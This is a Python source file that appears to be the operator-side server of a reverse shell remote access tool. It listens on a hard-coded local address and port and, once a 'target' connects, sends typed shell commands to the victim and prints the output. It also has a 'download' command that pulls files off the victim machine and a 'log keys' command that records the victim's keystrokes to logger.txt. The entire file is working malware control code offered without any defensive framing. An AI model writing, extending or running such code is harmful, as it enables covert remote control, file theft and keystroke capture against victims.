import socket as st
from os import system
import sys

sock = st.socket(st.AF_INET,st.SOCK_STREAM)
sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
sock.bind(('192.168.6.190',2222))
sock.listen()

con,addr = sock.accept()
try:
    if con:
        system('clear')
        print('[*] Connection established to the target')

        while True:
            cmd = input('>>>')
            if not cmd:
                continue

            elif cmd == 'clear':
                system('clear')

            elif 'download' in cmd:
                con.send(cmd.encode())
                getfile_name = cmd.split(maxsplit=1)[1]
                try:
                    with open(getfile_name,'wb') as file:
                        while True:
                            fetch_file = con.recv(8192)
                            if not fetch_file:
                                break
                            file.write(fetch_file)
                    print('file recieved...')
                    file.close()
                except Exception as e:
                    print(e)

            elif cmd == 'log keys':
                con.send(cmd.encode())
                print('start keylogger...')
                try:
                    while True:
                        getlogs = con.recv(1024).decode()
                        with open('logger.txt','a') as log:
                            log.write(getlogs)
                except KeyboardInterrupt:
                    log.close()
                continue
            elif cmd in ('quite','exit'):
                con.close()
                system('clear')
                print('target disconnected')
                sock.close()
                print('server disconnected')
                sys.exit(1)

            else:
                con.send(cmd.encode())
                output = con.recv(1168).decode()
                print(output,end='\n',flush=True)
                continue
except ConnectionResetError:
    print(f'Target disconected with IP : {addr[0]} and PORT : {addr[1]}')   
    sys.exit()

except Exception as err:
    print(err)
    sys.exit()